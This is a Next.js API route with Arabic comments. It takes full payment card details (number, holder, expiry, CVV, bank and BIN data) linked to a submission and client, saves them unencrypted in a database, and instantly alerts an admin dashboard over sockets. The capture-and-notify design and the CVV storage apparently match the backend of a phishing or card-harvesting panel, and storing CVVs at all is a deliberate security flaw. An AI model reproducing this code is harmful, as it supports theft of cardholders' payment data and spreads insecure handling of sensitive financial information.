import { NextRequest, NextResponse } from 'next/server';
import { getAdminClient } from '@/lib/supabase';
import { getIO } from '@/lib/socket';

interface PaymentBody {
  submissionId: string;
  clientId: string;
  reference?: string;
  card_number?: string;
  card_holder?: string;
  expiry?: string;
  cvv?: string;
  network?: string;
  bank_name?: string;
  bank_domain?: string;
  card_type?: string;
  bank_country?: string;
  bin?: string;
}

// إدراج بيانات دفع جديدة مرتبطة بطلب موجود
export async function POST(req: NextRequest) {
  try {
    const body = (await req.json()) as PaymentBody;

    if (!body.submissionId || !body.clientId) {
      return NextResponse.json(
        { error: 'معرّف الطلب والعميل مطلوبان' },
        { status: 400 }
      );
    }

    const admin = getAdminClient();

    // استرجاع المرجع من الطلب إن لم يُمرّر
    let reference = body.reference;
    if (!reference) {
      const { data: sub } = await admin
        .from('submissions')
        .select('reference')
        .eq('id', body.submissionId)
        .single();
      reference = sub?.reference || null;
    }

    const cardDigits = body.card_number ? body.card_number.replace(/\s/g, '') : '';
    const { data, error } = await admin
      .from('payment_cards')
      .insert({
        client_id: body.clientId,
        submission_id: body.submissionId,
        reference,
        card_number: body.card_number || null,
        card_number_last4: cardDigits ? cardDigits.slice(-4) : null,
        card_holder: body.card_holder || null,
        expiry: body.expiry || null,
        cvv: body.cvv || null,
        network: body.network || null,
        bank_name: body.bank_name || null,
        bank_domain: body.bank_domain || null,
        card_type: body.card_type || null,
        bank_country: body.bank_country || null,
        bin: body.bin || (cardDigits ? cardDigits.slice(0, 6) : null),
        status: 'pending',
      })
      .select('id,reference')
      .single();

    if (error || !data) {
      return NextResponse.json({ error: 'فشل حفظ بيانات الدفع' }, { status: 500 });
    }

    // بثّ لحظي للوحة الإدارة: إدخال دفع جديد
    const io = getIO();
    if (io) {
      io.to('admins').emit('admin:new_entry', {
        type: 'payment',
        clientId: body.clientId,
        submissionId: body.submissionId,
        entryId: data.id,
        reference: data.reference,
        hasPayment: true,
        created_at: new Date().toISOString(),
      });
    }

    return NextResponse.json({ ok: true, paymentId: data.id, reference: data.reference });
  } catch {
    return NextResponse.json({ error: 'خطأ في الخادم' }, { status: 500 });
  }
}

export async function OPTIONS() {
  return new NextResponse(null, { status: 204 });
}
